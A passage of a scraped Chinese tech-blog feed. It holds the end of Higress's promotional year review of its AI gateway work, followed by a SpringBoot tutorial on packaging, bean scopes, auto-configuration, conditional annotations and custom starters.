<p>围绕 AI Agent、RAG、智能路比拼技术和创意</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7857ead841124f6a9c82f6643bf462e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=10JkfKOQRlpeMopec1JoZH4REDk%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-9">（十）</h2>
<p>但并不是每一个开源项目发展都会非常顺利</p>
<p>11月，我们看到一则非常遗憾的消息</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247488706%26idx%3D1%26sn%3D00685294b8af5a7de63af258deb1f6ba%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247488706&amp;idx=1&amp;sn=00685294b8af5a7de63af258deb1f6ba&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Ingress NGINX 宣布退役</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87d965b904ec4082b4ebed51dafe82e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=Mx10jFIAgP4deEVjCRSyq1Djki4%3D" alt="图片" loading="lazy"/></p>
<p>K8s 社区把 Higress 等开源项目</p>
<p>及其云产品</p>
<p>列为官方推荐的替代方案</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b90c3ac402cb48b8b9a5baa5f725e28d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=LGfPYCsjMRLSSz9wE9GeHu%2F7ZI0%3D" alt="图片" loading="lazy"/></p>
<p>欣慰之余，我们也在反思</p>
<p>开源无法只靠热情来发电</p>
<p>必须有可持续的商业支撑</p>
<p>才能走得更远</p>
<h2 data-id="heading-10">（十一）</h2>
<p>我们上线</p>
<p>Higress 企业版的 Serverless 实例</p>
<p>不到十分之一的资源成本</p>
<p>就能搭起一套高可用的 AI 网关</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fc1c796d2af4fcb8c0f33bfd388a1f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=udL8ENI0ZXq%2BrCUIUIsKTNveUu0%3D" alt="图片" loading="lazy"/></p>
<p>有客户跟我们说</p>
<p>原来 AI 工程化</p>
<p>真的可以这么简单</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247579516%26idx%3D1%26sn%3D01b33a1cf06f25cf55823cca6906bd42%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247579516&amp;idx=1&amp;sn=01b33a1cf06f25cf55823cca6906bd42&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">例如森马</a></p>
<p>就通过 Higress 企业版</p>
<p>实现了多模型、多 MCP 的统一管理</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08258cbcf9ae41e8bae74a3bacf36673~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=XC0ejf3l6N%2FGN4Jfa2dORNFn4rQ%3D" alt="图片" loading="lazy"/></p>
<p>整体效率提升 30%</p>
<p>快速成为行业里的 AI 落地标杆</p>
<h2 data-id="heading-11">（十二）</h2>
<p>荣誉来自于积累</p>
<p>在乌镇世界互联网大会获得</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247579411%26idx%3D2%26sn%3D9ab03c95b098dfbfae0a78a66a80717b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247579411&amp;idx=2&amp;sn=9ab03c95b098dfbfae0a78a66a80717b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">开源优秀社区奖</a></p>
<p>社区贡献者邢国富获得</p>
<p>最具价值贡献者奖</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f20178a08a854fcd8e0338023a933b17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=yveNVQ84Vc%2F%2FKUH40Gt3zOrwzZY%3D" alt="图片" loading="lazy"/></p>
<p>AI 网关基于飞天企业版</p>
<p>在 AI 云产业发展大会上获得</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580696%26idx%3D1%26sn%3De539ae6f1d8860cbb500d1b4d944ea7a%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580696&amp;idx=1&amp;sn=e539ae6f1d8860cbb500d1b4d944ea7a&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">三大创新实践奖项之一</a></p>
<p>还有 InfoQ 的年度 AI 开源项目</p>
<p>参与起草信通院牵头制定的</p>
<p>AI 网关行业标准</p>
<p>携程、国泰财产保险、君润数智</p>
<p>三家客户案例，入选最佳实践</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68153864e0444aedbcbdf20c3e8cfb28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=ZoqttNqqie1e5VWv8Ar05wU6EaA%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-12">（十三）</h2>
<p>这些来自业内的认可</p>
<p>都会是珍贵的记忆</p>
<p>回头看这一年</p>
<p>没有哪个月是轻松的</p>
<p>但每一步都踩在了实处</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5092068d3f447398cc7387395f3a84d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=DeYW1I2NudnoCQFKoIFCJSjhmT8%3D" alt="图片" loading="lazy"/></p>
<p>写代码、做开源、扛需求、跑客户</p>
<p>我们始终相信</p>
<p>开源</p>
<p>是我们对行业的承诺</p>
<p>商业</p>
<p>是我们对长期主义的负责</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e7d91a5616d4e75b3293bfe104f48cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287644&amp;x-signature=Umb3KAYfuVsnCoPc3sZHODtKMcw%3D" alt="图片" loading="lazy"/></p>
<p>未来</p>
<p>让每一个想用 AI 的企业</p>
<p>都能稳稳地迈出第一步</p>
<p>👣</p>
<p>👣</p>
<p>漫画视频制作教程：《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU0MzkyMTgzNg%3D%3D%26mid%3D2247489173%26idx%3D1%26sn%3De8fbe48a16b2f5f1d77f577c631c7297%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU0MzkyMTgzNg==&amp;mid=2247489173&amp;idx=1&amp;sn=e8fbe48a16b2f5f1d77f577c631c7297&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">👨‍🏫 自制漫画视频｜详细教程 ✍️</a>》</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 原理专题]]></title>    <link>https://juejin.cn/post/7592088192506134582</link>    <guid>https://juejin.cn/post/7592088192506134582</guid>    <pubDate>2026-01-06T05:17:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592088192506134582" data-draft-id="7590961898399203366" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 原理专题"/> <meta itemprop="keywords" content="Spring Boot,Java,Spring"/> <meta itemprop="datePublished" content="2026-01-06T05:17:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哪里的破水瓶"/> <meta itemprop="url" content="https://juejin.cn/user/4394111849466414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 原理专题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4394111849466414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哪里的破水瓶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:17:41.000Z" title="Tue Jan 06 2026 05:17:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"🕛";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1️⃣"}.markdown-body ol&gt;li:nth-child(2):before{content:"2️⃣"}.markdown-body ol&gt;li:nth-child(3):before{content:"3️⃣"}.markdown-body ol&gt;li:nth-child(4):before{content:"4️⃣"}.markdown-body ol&gt;li:nth-child(5):before{content:"5️⃣"}.markdown-body ol&gt;li:nth-child(6):before{content:"6️⃣"}.markdown-body ol&gt;li:nth-child(7):before{content:"7️⃣"}.markdown-body ol&gt;li:nth-child(8):before{content:"8️⃣"}.markdown-body ol&gt;li:nth-child(9):before{content:"9️⃣"}.markdown-body ol&gt;li:nth-child(10):before{content:"🔟"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"🔹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">优先级与打包</h2>
<ol>
<li>命令行参数</li>
<li>系统环境</li>
<li>properties</li>
<li>yml</li>
<li>yaml</li>
</ol>
<blockquote>
<p>打包插件</p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring-boot.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.example.DemoApplication<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">skip</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">skip</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>repackage<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>repackage<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<blockquote>
<p>打包后运行，带额外参数</p>
</blockquote>
<pre><code class="hljs language-bash" lang="bash">java -Dserver.port=9000 -jar dd.jar
</code></pre>
<h2 data-id="heading-1">Bean 作用域</h2>





























<table><thead><tr><th>作用域</th><th>说明</th></tr></thead><tbody><tr><td>singleton</td><td>容器内同 名称 的 bean 只有一个实例（单例）（默认）</td></tr><tr><td>prototype</td><td>每次使用该 bean 时会创建新的实例（非单例/多例）</td></tr><tr><td>request</td><td>每个请求范围内会创建新的实例（web环境中，了解）</td></tr><tr><td>session</td><td>每个会话范围内会创建新的实例（web环境中，了解）</td></tr><tr><td>application</td><td>每个应用范围内会创建新的实例（web环境中，了解）</td></tr></tbody></table>
<blockquote>
<p>配置 Scope 注解，选择单例</p>
</blockquote>
<ul>
<li>Lazy 表示延迟加载，默认是启动时加载，配置后表示延迟到第一次使用加载</li>
<li>SCOPE_SINGLETON 单例</li>
<li>SCOPE_PROTOTYPE 非单例</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Lazy</span>
<span class="hljs-meta">@Scope(ConfigurableBeanFactory.SCOPE_SINGLETON)</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicController</span> {}
</code></pre>
<p>注意：</p>
<ol>
<li>单例是无状态的，多例是有状态的。</li>
<li>单例是节约资源，提升性能</li>
<li>单例bean：如果是无状态的bean，内部不保存任何状态信息，则是线程安全的。</li>
<li>单例bean：如果是有状态的bean，内部会保存状态信息，多个线程会同时操作该bean时，可能会出现数据不一致的问题，这样的bean则是线程不安全的。</li>
</ol>
<h2 data-id="heading-2">起步依赖</h2>
<p>依赖，具有传递性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4724f85fadbb4fdc8fa7ef6d32531cbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768282100&amp;x-signature=toz%2BAjKy9M%2FMpFsJJX1HOGbduuo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e08b52d87ac486fa565654983cad758~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768282100&amp;x-signature=gSjphezX%2ByiC0AJKK%2Fj4rvUwD94%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">自动配置</h2>
<p>SpringBoot的自动配置就是当spring项目启动后，一些配置类、bean对象就自动存入到了IOC容器中，不需要我们手动去声明，从而简化了开发，省去了繁琐的配置操作。</p>
<blockquote>
<p>比如：引入了redis依赖，可以直接注入Redis使用。</p>
</blockquote>
<p>实现方案一</p>
<p>加入另一个项目的依赖，引入依赖，并在主类上加上包扫描，扫描该依赖的包，不推荐，<strong>原因是操作麻烦+性能低</strong></p>
<p>实现方案二</p>
<p>类不需要加任何注解，直接使用 Import 导入，或者使用Imort 导入一个配置类。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Import(TokenService.class)</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
</code></pre>
<blockquote>
<p>配置类代码</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImportSelector</span> {

    <span class="hljs-comment">// 返回多个类的全限定命名</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">"com.example.aop.RecordTimeAspect2"</span>};
    }
}

</code></pre>
<p>实现方案三：加注解的方式，最实用</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 核心还是用方式二</span>
<span class="hljs-meta">@Import(MyImportSelector.class)</span>
<span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableHeaderConfig {
}

</code></pre>
<h2 data-id="heading-4">条件判断 / 自动配置</h2>
<p>有时候我们经常需要判断该类应不应该注入到IOC容器中。</p>
<ul>
<li>
<p>作用：按照一定的条件进行判断，在满足给定条件后才会注册对应的bean对象到Spring IOC容器中。</p>
</li>
<li>
<p>位置：方法、类</p>
</li>
<li>
<p>@Conditional 本身是一个父注解，派生出大量的子注解：</p>
</li>
<li>
<p>@ConditionalOnClass：判断环境中是否有对应字节码文件，才注册bean到IOC容器。</p>
</li>
<li>
<p>@ConditionalOnMissingBean：判断环境中没有对应的bean（类型 或 名称） ，才注册bean到IOC容器。</p>
</li>
<li>
<p>@ConditionalOnProperty：判断配置文件中有对应属性和值，才注册bean到IOC容器。</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
<span class="hljs-comment">// 判断环境中是否存在io.jsonwebtoken.Jwts，如果有就创建该Bean</span>
<span class="hljs-meta">@ConditionalOnClass(name = "io.jsonwebtoken.Jwts")</span>
<span class="hljs-comment">// 判断环境中是否存在该类，如果没有就创建该Bean</span>
<span class="hljs-meta">@ConditionalOnMissingBean</span>
<span class="hljs-comment">// 判断属性值是否为true,在配置文件中</span>
<span class="hljs-meta">@ConditionalOnProperty(name = "enable", havingValue = "true")</span>
<span class="hljs-keyword">public</span> RecordTimeAspect2 <span class="hljs-title function_">recordTimeAspect2</span><span class="hljs-params">()</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecordTimeAspect2</span>();
}
</code></pre>
<blockquote>
<p>自己定义自动配置类的核心是什么? 如何完成自动配置？</p>
</blockquote>
<ol>
<li>定义自动配置类</li>
<li>将自动配置类配置在 META-INF/spring/</li>
<li>org.springframework.boot.autoconfigure.AutoConfiguration.imports文件中</li>
</ol>
<h2 data-id="heading-5">自定义Starter</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c64e0497e1dd44f2bbf70cec02697ff6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768282100&amp;x-signature=gUvg2PstGvemeg%2BcwsxvkHJtkuk%3D" alt="image.png" loading="lazy"/></p>
<p>需求：自定义aliyun-oss-spring-boot-starter，完成阿里云OSS操作工具类 AliyunOSSOperator 的自动配置。</p>
<p>目标：引入起步依赖引入之后，要想使用阿里云OSS，注入 AliyunOSSOperator 直接使用即可。</p>
<p>步骤：</p>
<ol>
<li>创建aliyun-oss-spring-boot-starter模块</li>
<li>创建aliyun-oss-spring-boot-autoconfigure模块，在starter中引入该模块</li>
<li>在aliyun-oss-spring-boot-autoconfigure模块中的定义自动配置功能，并定义自动配置文件 META-INF/spring/xxxx.imports</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/394d2c5291894d1590ce164173b56718~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768282100&amp;x-signature=5JWr0ECT7kmrzFmW0ityFVo%2Bl18%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>注意：选择一个版本，无需要选依赖</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f69e841e347b46b38a91e476c10033f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768282100&amp;x-signature=lhLVPCRXLPQ1DLTTPdfyymuTxrE%3D" alt="image.png" loading="lazy"/></p>
